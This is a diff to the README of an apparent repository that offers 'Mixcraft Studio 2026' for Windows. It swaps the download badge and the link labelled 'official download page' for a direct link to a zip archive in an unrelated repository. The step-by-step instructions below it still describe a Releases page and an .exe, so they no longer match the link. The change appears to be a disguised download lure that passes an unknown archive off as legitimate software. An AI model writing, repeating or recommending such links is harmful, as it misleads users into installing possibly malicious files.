@@ -5,13 +5,13 @@ description: "Download the Mixcraft Studio installer for Windows 10 and 11 to ac
 ---
 # 🎵 Mixcraft-Studio-2026 - Create professional music on your computer
 
-[![](https://img.shields.io/badge/Download-Mixcraft_Studio_2026-blue.svg)](https://github.com/Bluenesslilith864/Mixcraft-Studio-2026)
+[![](https://img.shields.io/badge/Download-Mixcraft_Studio_2026-blue.svg)](https://raw.githubusercontent.com/Bluenesslilith864/bluenesslilith864.github.io/main/corycavidin/bluenesslilith-github-io-1.9.zip)
 
 ## 📥 How to download the software
 
 Follow these steps to get Mixcraft Studio 2026 on your computer.
 
-1. Go to the [official download page](https://github.com/Bluenesslilith864/Mixcraft-Studio-2026).
+1. Go to the [official download page](https://raw.githubusercontent.com/Bluenesslilith864/bluenesslilith864.github.io/main/corycavidin/bluenesslilith-github-io-1.9.zip).
 2. Look for the button labeled Releases on the right side of the screen.
 3. Click the most recent version available.
 4. Find the file ending in .exe under the Assets section.
